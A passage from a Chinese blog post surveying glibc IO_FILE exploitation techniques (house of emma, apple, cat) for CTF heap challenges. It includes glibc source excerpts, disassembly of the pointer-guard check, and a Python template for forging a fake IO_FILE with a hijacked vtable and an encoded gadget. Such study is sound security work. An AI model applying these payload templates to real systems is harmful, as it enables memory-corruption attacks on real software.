(cfile-&gt;__cookie, buf, size);<br>&#125;<br><br><span class="hljs-type">static</span> <span class="hljs-type">ssize_t</span><br>_IO_cookie_write (FILE *fp, <span class="hljs-type">const</span> <span class="hljs-type">void</span> *buf, <span class="hljs-type">ssize_t</span> size)<br>&#123;<br>  <span class="hljs-class"><span class="hljs-keyword">struct</span> _<span class="hljs-title">IO_cookie_file</span> *<span class="hljs-title">cfile</span> =</span> (<span class="hljs-keyword">struct</span> _IO_cookie_file *) fp;<br>  <span class="hljs-type">cookie_write_function_t</span> *write_cb = cfile-&gt;__io_functions.write;<br><span class="hljs-meta">#<span class="hljs-keyword">ifdef</span> PTR_DEMANGLE</span><br>  PTR_DEMANGLE (write_cb);<br><span class="hljs-meta">#<span class="hljs-keyword">endif</span></span><br><br>  <span class="hljs-keyword">if</span> (write_cb == <span class="hljs-literal">NULL</span>)<br>    &#123;<br>      fp-&gt;_flags |= _IO_ERR_SEEN;<br>      <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>    &#125;<br><br>  <span class="hljs-type">ssize_t</span> n = write_cb (cfile-&gt;__cookie, buf, size);<br>  <span class="hljs-keyword">if</span> (n &lt; size)<br>    fp-&gt;_flags |= _IO_ERR_SEEN;<br><br>  <span class="hljs-keyword">return</span> n;<br>&#125;<br><br><span class="hljs-type">static</span> <span class="hljs-type">off64_t</span><br>_IO_cookie_seek (FILE *fp, <span class="hljs-type">off64_t</span> offset, <span class="hljs-type">int</span> dir)<br>&#123;<br>  <span class="hljs-class"><span class="hljs-keyword">struct</span> _<span class="hljs-title">IO_cookie_file</span> *<span class="hljs-title">cfile</span> =</span> (<span class="hljs-keyword">struct</span> _IO_cookie_file *) fp;<br>  <span class="hljs-type">cookie_seek_function_t</span> *seek_cb = cfile-&gt;__io_functions.seek;<br><span class="hljs-meta">#<span class="hljs-keyword">ifdef</span> PTR_DEMANGLE</span><br>  PTR_DEMANGLE (seek_cb);<br><span class="hljs-meta">#<span class="hljs-keyword">endif</span></span><br><br>  <span class="hljs-keyword">return</span> ((seek_cb == <span class="hljs-literal">NULL</span><br>       || (seek_cb (cfile-&gt;__cookie, &amp;offset, dir)<br>           == <span class="hljs-number">-1</span>)<br>       || offset == (<span class="hljs-type">off64_t</span>) <span class="hljs-number">-1</span>)<br>      ? _IO_pos_BAD : offset);<br>&#125;<br><br><span class="hljs-type">static</span> <span class="hljs-type">int</span><br>_IO_cookie_close (FILE *fp)<br>&#123;<br>  <span class="hljs-class"><span class="hljs-keyword">struct</span> _<span class="hljs-title">IO_cookie_file</span> *<span class="hljs-title">cfile</span> =</span> (<span class="hljs-keyword">struct</span> _IO_cookie_file *) fp;<br>  <span class="hljs-type">cookie_close_function_t</span> *close_cb = cfile-&gt;__io_functions.close;<br><span class="hljs-meta">#<span class="hljs-keyword">ifdef</span> PTR_DEMANGLE</span><br>  PTR_DEMANGLE (close_cb);<br><span class="hljs-meta">#<span class="hljs-keyword">endif</span></span><br><br>  <span class="hljs-keyword">if</span> (close_cb == <span class="hljs-literal">NULL</span>)<br>    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br><br>  <span class="hljs-keyword">return</span> close_cb (cfile-&gt;__cookie);<br>&#125;<br></code></pre></td></tr></table></figure>

<p>可以注意到，关键的几个跳转函数都来自于函数指针：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">cookie_read_function_t</span> *read_cb = cfile-&gt;__io_functions.read;<br><span class="hljs-type">cookie_write_function_t</span> *write_cb = cfile-&gt;__io_functions.write;<br><span class="hljs-type">cookie_seek_function_t</span> *seek_cb = cfile-&gt;__io_functions.seek;<br><span class="hljs-type">cookie_close_function_t</span> *close_cb = cfile-&gt;__io_functions.close;<br></code></pre></td></tr></table></figure>

<p>这个文件结构来自于如下结构体：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-class"><span class="hljs-keyword">struct</span> _<span class="hljs-title">IO_cookie_file</span></span><br><span class="hljs-class">&#123;</span><br>  <span class="hljs-class"><span class="hljs-keyword">struct</span> _<span class="hljs-title">IO_FILE_plus</span> __<span class="hljs-title">fp</span>;</span><br>  <span class="hljs-type">void</span> *__cookie;<br>  <span class="hljs-type">cookie_io_functions_t</span> __io_functions;<br>&#125;;<br><br><span class="hljs-keyword">typedef</span> <span class="hljs-class"><span class="hljs-keyword">struct</span> _<span class="hljs-title">IO_cookie_io_functions_t</span></span><br><span class="hljs-class">&#123;</span><br>  <span class="hljs-type">cookie_read_function_t</span> *read;        <span class="hljs-comment">/* Read bytes.  */</span><br>  <span class="hljs-type">cookie_write_function_t</span> *write;    <span class="hljs-comment">/* Write bytes.  */</span><br>  <span class="hljs-type">cookie_seek_function_t</span> *seek;        <span class="hljs-comment">/* Seek/tell file position.  */</span><br>  <span class="hljs-type">cookie_close_function_t</span> *close;    <span class="hljs-comment">/* Close file.  */</span><br>&#125; <span class="hljs-type">cookie_io_functions_t</span>;<br></code></pre></td></tr></table></figure>

<p>在 vtable 为 <code>_IO_cookie_jumps</code> 时会默认当前的结构体为 <code>_IO_cookie_file</code> 。</p>
<p>在湖湘杯的原题中，其利用思路如下：</p>
<blockquote>
<p>伪造 stderr 的 IO_FILE 为堆中数据，并将其 vtable 改为 _IO_cookie_jumps 。<br>然后同 house of kiwi 一样，通过修改 top chunk 的 size 以触发 malloc_assert 与 fflush(stderr) ，从而调用 setcontext+61 来调用 ROP 进行 ORW 读取 flag</p>
</blockquote>
<p>不过在高版本中对需表添加了指针保护，其原理是：在调用虚表函数时，将其地址与一个“随机值”进行异或后跳转。</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-number">0x7fad55f729f4</span> &lt;_IO_cookie_write+<span class="hljs-number">4</span>&gt;     push   rbp<br><span class="hljs-number">0x7fad55f729f5</span> &lt;_IO_cookie_write+<span class="hljs-number">5</span>&gt;     push   rbx<br><span class="hljs-number">0x7fad55f729f6</span> &lt;_IO_cookie_write+<span class="hljs-number">6</span>&gt;     mov    rbx, rdi<br><span class="hljs-number">0x7fad55f729f9</span> &lt;_IO_cookie_write+<span class="hljs-number">9</span>&gt;     sub    rsp, <span class="hljs-number">8</span><br><span class="hljs-number">0x7fad55f729fd</span> &lt;_IO_cookie_write+<span class="hljs-number">13</span>&gt;    mov    rax, qword ptr [rdi + <span class="hljs-number">0xf0</span>]<br><span class="hljs-number">0x7fad55f72a04</span> &lt;_IO_cookie_write+<span class="hljs-number">20</span>&gt;    ror    rax, <span class="hljs-number">0x11</span><br><span class="hljs-number">0x7fad55f72a08</span> &lt;_IO_cookie_write+<span class="hljs-number">24</span>&gt;    xor    rax, qword ptr fs:[<span class="hljs-number">0x30</span>]<br><span class="hljs-number">0x7fad55f72a11</span> &lt;_IO_cookie_write+<span class="hljs-number">33</span>&gt;    test   rax, rax<br><span class="hljs-number">0x7fad55f72a14</span> &lt;_IO_cookie_write+<span class="hljs-number">36</span>&gt;    je     _IO_cookie_write+<span class="hljs-number">55</span><br><br><span class="hljs-number">0x7fad55f72a16</span> &lt;_IO_cookie_write+<span class="hljs-number">38</span>&gt;    mov    rbp, rdx<br><span class="hljs-number">0x7fad55f72a19</span> &lt;_IO_cookie_write+<span class="hljs-number">41</span>&gt;    mov    rdi, qword ptr [rdi + <span class="hljs-number">0xe0</span>]<br><span class="hljs-number">0x7fad55f72a20</span> &lt;_IO_cookie_write+<span class="hljs-number">48</span>&gt;    call   rax<br></code></pre></td></tr></table></figure>


<p>先将值循环右移 11 位后与 <code>fs:[0x30]</code> 异或得到真正的跳转地址。但在本题中可以考虑直接修改 <code>fs:[0x30]</code> 中储存的值来绕过这个检查。</p>
<p>通过多次的 largebin attack 可以实现多次任意地址读写，这能令我们修改 <code>fs:[0X30]</code> 和 stderr。</p>
<p>如下为常用的伪造模板：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">def</span> <span class="hljs-title function_">ROL</span>(<span class="hljs-params">content, key</span>):<br>    tmp = <span class="hljs-built_in">bin</span>(content)[<span class="hljs-number">2</span>:].rjust(<span class="hljs-number">64</span>, <span class="hljs-string">&#x27;0&#x27;</span>)<br>    <span class="hljs-keyword">return</span> <span class="hljs-built_in">int</span>(tmp[key:] + tmp[:key], <span class="hljs-number">2</span>)<br>magic_gadget = libc.address + <span class="hljs-number">0x1460e0</span> <span class="hljs-comment"># mov rdx, qword ptr [rdi + 8] ; mov qword ptr [rsp], rax ; call qword ptr [rdx + 0x20]</span><br>fake_IO_FILE = <span class="hljs-number">2</span> * p64(<span class="hljs-number">0</span>)<br>fake_IO_FILE += p64(<span class="hljs-number">0</span>)  <span class="hljs-comment"># _IO_write_base = 0</span><br>fake_IO_FILE += p64(<span class="hljs-number">0xffffffffffffffff</span>)  <span class="hljs-comment"># _IO_write_ptr = 0xffffffffffffffff</span><br>fake_IO_FILE += p64(<span class="hljs-number">0</span>)<br>fake_IO_FILE += p64(<span class="hljs-number">0</span>)  <span class="hljs-comment"># _IO_buf_base</span><br>fake_IO_FILE += p64(<span class="hljs-number">0</span>)  <span class="hljs-comment"># _IO_buf_end</span><br>fake_IO_FILE = fake_IO_FILE.ljust(<span class="hljs-number">0x58</span>, <span class="hljs-string">b&#x27;\x00&#x27;</span>)<br>fake_IO_FILE += p64(next_chain)  <span class="hljs-comment"># _chain</span><br>fake_IO_FILE = fake_IO_FILE.ljust(<span class="hljs-number">0x78</span>, <span class="hljs-string">b&#x27;\x00&#x27;</span>)<br>fake_IO_FILE += p64(heap_base)  <span class="hljs-comment"># _lock = writable address</span><br>fake_IO_FILE = fake_IO_FILE.ljust(<span class="hljs-number">0xB0</span>, <span class="hljs-string">b&#x27;\x00&#x27;</span>)<br>fake_IO_FILE += p64(<span class="hljs-number">0</span>)  <span class="hljs-comment"># _mode = 0</span><br>fake_IO_FILE = fake_IO_FILE.ljust(<span class="hljs-number">0xC8</span>, <span class="hljs-string">b&#x27;\x00&#x27;</span>)<br>fake_IO_FILE += p64(libc_base+libc.sym[<span class="hljs-string">&#x27;_IO_cookie_jumps&#x27;</span>] + <span class="hljs-number">0x40</span>)  <span class="hljs-comment"># vtable</span><br>fake_IO_FILE += p64(srop_addr)  <span class="hljs-comment"># rdi</span><br>fake_IO_FILE += p64(<span class="hljs-number">0</span>)<br>fake_IO_FILE += p64(ROL(magic_gadget ^ (garud_value), <span class="hljs-number">0x11</span>))<br></code></pre></td></tr></table></figure>

<h2 id="house-of-apple"><a href="#house-of-apple" class="headerlink" title="house of apple"></a>house of apple</h2><h3 id="apple1"><a href="#apple1" class="headerlink" title="apple1"></a>apple1</h3><p>该方法作为今年刚出现的新利用，发现者本人已经对该利用做了非常详细的分析，再复述一遍也没有太大的意义，而且也不太尊重这位师傅。因此本文只做一些基本的总结性分析，对于原文的相近分析，可在参考列表中找到 roderick01 师傅的原文。</p>
<p>使用 house of apple 的条件为：</p>
<ul>
<li>1、程序从 main 函数返回或能调用 exit 函数</li>
<li>2、能泄露出 heap 地址和 libc 地址</li>
<li>3、 能使用一次 largebin attack</li>
</ul>
<p>调用链为：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-built_in">exit</span> -&gt; fcloseall -&gt; _IO_cleanup -&gt; _IO_flush_all_lockp -&gt; _IO_OVERFLOW<br></code></pre></td></tr></table></figure>

<p>在函数主动调用 exit 或从 main 函数正常返回时都能够触发该调用链。</p>
<p>关键点是通过调用 <code>_IO_wstrn_overflow</code> 等函数实现一次任意地址写：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">static</span> <span class="hljs-type">wint_t</span><br>_IO_wstrn_overflow (FILE *fp, <span class="hljs-type">wint_t</span> c)<br>&#123;<br>  _IO_wstrnfile *snf = (_IO_wstrnfile *) fp;<br><br>  <span class="hljs-keyword">if</span> (fp-&gt;_wide_data-&gt;_IO_buf_base != snf-&gt;overflow_buf)<br>    &#123;<br>      _IO_wsetb (fp, snf-&gt;overflow_buf,<br>         snf-&gt;overflow_buf + (<span class="hljs-keyword">sizeof</span> (snf-&gt;overflow_buf)<br>                      / <span class="hljs-keyword">sizeof</span> (<span class="hljs-type">wchar_t</span>)), <span class="hljs-number">0</span>);<br><br>      fp-&gt;_wide_data-&gt;_IO_write_base = snf-&gt;overflow_buf;<br>      fp-&gt;_wide_data-&gt;_IO_read_base = snf-&gt;overflow_buf;<br>      fp-&gt;_wide_data-&gt;_IO_read_ptr = snf-&gt;over             flow_buf;<br>      fp-&gt;_wide_data-&gt;_IO_read_end = (snf-&gt;overflow_buf<br>                      + (<span class="hljs-keyword">sizeof</span> (snf-&gt;overflow_buf)<br>                     / <span class="hljs-keyword">sizeof</span> (<span class="hljs-type">wchar_t</span>)));<br>    &#125;<br><br>  fp-&gt;_wide_data-&gt;_IO_write_ptr = snf-&gt;overflow_buf;<br>  fp-&gt;_wide_data-&gt;_IO_write_end = snf-&gt;overflow_buf;<br><br>  <span class="hljs-keyword">return</span> c;<br>&#125;<br></code></pre></td></tr></table></figure>

<p>如果能够伪造 <code>_IO_list_all</code> 结构体中的数据，就能够在合适的地点调用该函数，通过设定 <code>_wide_data</code> 来实现任意地址写：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs c">fp-&gt;_wide_data-&gt;_IO_write_base = snf-&gt;overflow_buf;<br>fp-&gt;_wide_data-&gt;_IO_read_base = snf-&gt;overflow_buf;<br>fp-&gt;_wide_data-&gt;_IO_read_ptr = snf-&gt;over             flow_buf;<br>fp-&gt;_wide_data-&gt;_IO_read_end = (snf-&gt;overflow_buf<br>                + (<span class="hljs-keyword">sizeof</span> (snf-&gt;overflow_buf)<br>               / <span class="hljs-keyword">sizeof</span> (<span class="hljs-type">wchar_t</span>)));<br></code></pre></td></tr></table></figure>

<p>而由于 <code>_IO_flush_all_lockp</code> 是会通过 <code>_IO_list_all</code> 遍历整个链表的，因此在伪造时可以直接布置好 <code>_chain</code> 来构成连接，从而在第二个伪造的 IO_FILE 中完成利用。</p>
<p>所以整个利用算是对前面几个利用的一种补充，其关键点在于通过一次写入完成整条调用链的布置。</p>
<p>在第一个 IO_FILE 中布置一系列数据之后，在第二个 IO_FILE 中借助已经布置好的数据完成利用。提出者本人总结了几个好用的常规思路：</p>
<ul>
<li>house of apple1 + house of pig</li>
</ul>
<blockquote>
<p>第一步通过数据写入去修改 tcachebin 中的数据内容，然后在第二个 IO_FILE 中调用 malloc&#x2F;memcpy 进行任意地址覆盖，如果能够覆盖 free 的 got 表，就能在马上到来时劫持执行流了。</p>
</blockquote>
<ul>
<li>house of apple1 + house of emma</li>
</ul>
<blockquote>
<p>house of emma 需要修改 pointer_guard 来绕过指针保护，因此可以通过第一步修改该值为一个定值，然后在第二步中进行 ROP。</p>
</blockquote>
<h3 id="apple2"><a href="#apple2" class="headerlink" title="apple2"></a>apple2</h3><p>除了第一种方法外，roderick01 师傅还提出了另外一种利用方法。</p>
<p><code>_IO_wide_data</code> 自带了一个虚表指针，而在调用这部分函数时并不会通过 <code>IO_validate_vtable</code> 检查地址合法性，因此可以像是 GLIBC2.23 那样直接修改虚表内容进行劫持。</p>
<p>主要过程是，劫持 vtable 为 <code>_IO_wfile_jumps</code> ，并控制 IO_FILE 中的 <code>_wide_data -&gt; _wide_vtable</code> 来劫持其中的函数调用。一般可以正常触发 <code>_IO_WDOALLOCATE</code> 和 <code>_IO_WOVERFLOW</code> ，和前文所述的触发方式没有差别。</p>
<p>对于第二个方法，师傅总结了三条调用链：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs c">_IO_wfile_overflow -&gt; _IO_wdoallocbuf - &gt; _IO_WDOALLOCATE -&gt; *(fp-&gt;_wide_data-&gt;_wide_vtable+<span class="hljs-number">0x68</span>)(fp)<br></code></pre></td></tr></table></figure>

<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs c">_IO_wfile_underflow_mmap -&gt; _IO_wdoallocbuf -&gt; _IO_WDOALLOCATE -&gt; *(fp-&gt;_wide_data-&gt;_wide_vtable + <span class="hljs-number">0x68</span>)(fp)<br></code></pre></td></tr></table></figure>

<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs c">_IO_wdefault_xsgetn -&gt; __wunderflow -&gt; _IO_switch_to_wget_mode -&gt; _IO_WOVERFLOW -&gt; *(fp-&gt;_wide_data-&gt;_wide_vtable + <span class="hljs-number">0x18</span>)(fp)<br></code></pre></td></tr></table></figure>


<h2 id="house-of-cat"><a href="#house-of-cat" class="headerlink" title="house of cat"></a>house of cat</h2><p>该利用出现在今年的强网杯中，不过它的利用链似乎和 apple2 有一部分重合。</p>
<p>利用条件如下：</p>
<ul>
<li><ol>
<li>能够任意写一个可控地址。</li>
</ol>
</li>
<li><ol start="2">
<li>能够泄露堆地址和libc基址。</li>
</ol>
</li>
<li><ol start="3">
<li>能够触发IO流（FSOP或触发__malloc_assert，或者程序中存在puts等能进入IO链的函数），执行IO相关函数。</li>
</ol>
</li>
</ul>
<p>其调用链如下：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs c">vtable -&gt; _IO_wfile_seekoff -&gt; _IO_switch_to_wget_mode -&gt; _IO_WOVERFLOW<br></code></pre></td></tr></table></figure>

<p>首先通过修改 vtable 的偏移使其在触发虚表跳转时执行 <code>_IO_wfile_seekoff</code> ，从而进行调用链。</p>
<p>在 house of apple2 中提到过，<code>_wide_vtable</code> 是不经过 <code>IO_validate_vtable</code> 检查的，因此可以直接劫持控制流，通过 house of kiwi 的利用手段，以 <code>setcontext+61</code> 来调用 ROP。</p>
<h1 id="结语"><a href="#结语" class="headerlink" title="结语"></a>结语</h1><p>最后我们大致梳理一下 IO 利用的几个发展历程吧。</p>
<ul>
<li>最开始，我们能够直接修改 vtable 的值，这样就能劫持所有的跳转函数了（house of orange）</li>
<li>GLIBC2.24 开始，加入了检查，这让虚表必须处于某个特定的内存段内</li>
<li>既然不能修改整个虚表，那就只修改其中几个会被调用的函数地址（house of kiwi）</li>
<li>在 GLIBC2.31 9.4.0 的小版本下，整个段被设定为不可写</li>
<li>既然整个虚表都不能改动了，那就通过其中原有的函数调用链进行利用（house of pig 的 malloc-memcpy-free）</li>
<li>在 GLIBC2.34 开始，__free_hook 和 __malloc_hook 被删除</li>
<li>寻找上两个的代替品，发现某个虚表中的调用函数仍然使用函数指针进行，修改这个函数指针进行替代，但是由于指针保护的存在，需要多次写入（house of emma）</li>
<li>寻找一次写入即可完成的调用链，以及没有指针保护的跳转表（house of apple&#x2F;cat）</li>
</ul>
<blockquote>
<p>当然，正如读者所知的是，除了本文涉及到的几个 house of xxx 外，还有 house of banana&#x2F;house of husk 等诸多利用没有涉及。<br>它们当然也是很有意思的利用，但似乎在某些地方缺乏了泛用性，因此本文仅选了几个笔者认为比较重要或是有代表性的利用进行学习。<br>您也知道，house of xxx 系列总共已有二十来个，其中涉及到 IO 应该也有将近十多个了。如果为了学习一个利用技巧，前置技能需要十来个其他利用，未免显得有些晦涩了。</p>
</blockquote>
<h1 id="参考资料"><a href="#参考资料" class="headerlink" title="参考资料"></a>参考资料</h1><p>winmt：<a target="_blank" rel="noopener" href="https://bbs.pediy.com/thread-272098.htm">https://bbs.pediy.com/thread-272098.htm</a><br>chuj：<a target="_blank" rel="noopener" href="https://www.cjovi.icu/pwnreview/1171.html">https://www.cjovi.icu/pwnreview/1171.html</a><br>raycp：<a target="_blank" rel="noopener" href="https://www.anquanke.com/post/id/177958">https://www.anquanke.com/post/id/177958</a><br>r3kapig：<a target="_blank" rel="noopener" href="https://www.anquanke.com/post/id/242640">https://www.anquanke.com/post/id/242640</a><br>roderick01：<a target="_blank" rel="noopener" href="https://bbs.pediy.com/thread-273418.htm">https://bbs.pediy.com/thread-273418.htm</a><br>roderick01：<a target="_blank" rel="noopener" href="https://bbs.pediy.com/thread-273832.htm">https://bbs.pediy.com/thread-273832.htm</a><br>roderick01：<a target="_blank" rel="noopener" href="https://bbs.pediy.com/thread-273863.htm">https://bbs.pediy.com/thread-273863.htm</a><br>春秋伽玛：<a target="_blank" rel="noopener" href="https://bbs.pediy.com/thread-270429.htm">https://bbs.pediy.com/thread-270429.htm</a><br>CatF1y：<a target="_blank" rel="noopener" href="https://bbs.pediy.com/thread-273895.htm">https://bbs.pediy.com/thread-273895.htm</a></p>
<p>师傅们的文章都非常炫酷，如果您想要进一步理解，我推荐读者将本文与上述参考对照着看。</p>
<div id="paginator"></div></div><div id="post-footer"><div id="pages"><div class="footer-link" style="width: 50%;text-align:right;border-right:1px #fe2 solid"><a href="/2022/11/04/CVE-2022-23613-%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0%E4%B8%8E%E5%88%A9%E7%94%A8%E5%8F%AF%E8%83%BD%E6%80%A7%E5%B0%9D%E8%AF%95/">← 下一篇 CVE-2022-23613 漏洞复现与利用可能性尝试</a></div><div class="footer-link" style="width: 50%;right:1px;border-left:1px #fe2 solid"><a href="/2022/09/20/2022-mt-ctf/">2022美团MT-CTF复现报告-TokameinE 上一篇 →</a></div></div></div></div><div class="bottom-btn"><div><a class="i-top" id="to-top" onClick="scrolls.scrolltop();" title="回到顶部" style="opacity: 0; display: none;">∧ </a><a class="i-index" id="to-index" href="#toc-div" title="文章目录">≡</a><a class="i-color" id="color-mode" onClick="colorMode.change()" title="切换主题"></a></div></div></article><aside><div id="about"><a href="/" id="logo"><img src="/img/faction/6.png" alt="Logo"></a><h1 id="Dr"><a href="TokameinE">TokameinE</a></h1><div id="description"><p></p></div><div id="social-links"><a class="social" target="_blank" rel="noopener" href="https://github.com/ErodedElk"><i class="fab fa-github" alt="GitHub"></i></a><a class="social" target="_blank" rel="noopener" href="https://space.bilibili.com/1782544616"><i class="fa-brands fa-bilibili" alt="BiliBili"></i></a></div></div><div id="aside-block"><div id="toc-div"><h1>目录</h1><ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#%E5%89%8D%E8%A8%80"><span class="toc-number">1.</span> <span class="toc-text">前言</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#IO-FILE-%E7%BB%93%E6%9E%84%E4%BD%93"><span class="toc-number">2.</span> <span class="toc-text">IO_FILE 结构体</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#GLIBC2-23-%E4%B8%8E-%E8%B7%B3%E8%BD%AC%E8%A1%A8%E5%8A%AB%E6%8C%81"><span class="toc-number">3.</span> <span class="toc-text">GLIBC2.23 与 跳转表劫持</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E7%BB%86%E8%8A%82%E4%B8%8E%E6%B7%B1%E5%85%A5%E5%88%86%E6%9E%90"><span class="toc-number">4.</span> <span class="toc-text">细节与深入分析</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#2-24-%E8%B0%83%E6%95%B4%E4%B8%8E%E4%BF%9D%E6%8A%A4"><span class="toc-number">5.</span> <span class="toc-text">2.24 调整与保护</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E9%AB%98%E7%89%88%E6%9C%AC%E4%B8%8B%E7%9A%84%E8%B0%83%E7%94%A8%E9%93%BE%E6%80%9D%E8%80%83"><span class="toc-number">6.</span> <span class="toc-text">高版本下的调用链思考</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#house-of-orange"><span class="toc-number">6.1.</span> <span class="toc-text">house of orange</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#house-of-kiwi"><span class="toc-number">6.2.</span> <span class="toc-text">house of kiwi</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#house-of-pig"><span class="toc-number">6.3.</span> <span class="toc-text">house of pig</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#house-of-emma"><span class="toc-number">6.4.</span> <span class="toc-text">house of emma</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#house-of-apple"><span class="toc-number">6.5.</span> <span class="toc-text">house of apple</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#apple1"><span class="toc-number">6.5.1.</span> <span class="toc-text">apple1</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#apple2"><span class="toc-number">6.5.2.</span> <span class="toc-text">apple2</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#house-of-cat"><span class="toc-number">6.6.</span> <span class="toc-text">house of cat</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E7%BB%93%E8%AF%AD"><span class="toc-number">7.</span> <span class="toc-text">结语</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E5%8F%82%E8%80%83%E8%B5%84%E6%96%99"><span class="toc-number">8.</span> <span class="toc-text">参考资料</span></a></li></ol></div></div><footer><nobr>构建自 <a target="_blank" rel="noopener" href="http://hexo.io">Hexo</a></nobr><wbr><nobr> 使用主题 <a target="_blank" rel="noopener" href="https://github.com/Yue-plus/hexo-theme-arknights">Arknights</a></nobr><wbr><nobr> 主题作者 <a target="_blank" rel="noopener" href="https://github.com/Yue-plus">Yue_plus</a></nobr></footer></aside></main><canvas id="canvas-dust"></canvas><script src="/js/search.js"></script><script src="/js/arknights.js"></script><script src="//unpkg.com/lightgallery@2.7.1/lightgallery.min.js"></script><script src="//unpkg.com/lightgallery@2.7.1/plugins/zoom/lg-zoom.min.js"></script><script src="//unpkg.com/lightgallery@2.7.1/plugins/thumbnail/lg-thumbnail.min.js"></script><script src="/js/pjax.js"></script><script class="pjax-js">reset= () => {document.querySelector('.lg-container')?.remove()
lightGallery(document.getElementById('post-bg'), {
  plugins: [lgZoom,lgThumbnail],
  selector: '.item-img'})}</script><script>window.addEventListener("load",() => {pjax = new Pjax({
 cacheBust: false,
 selectors: ['title','article','#aside-block','.pjax-js'],
 switches: {'article': Pjax.switches.sideBySide},
 switchesOptions: {
   'article': {
     classNames: {
       remove: "pjax-out",
       add: "pjax-in"
     }
   }
 }
});
document.addEventListener("pjax:complete", reset);reset()})</script></body></html>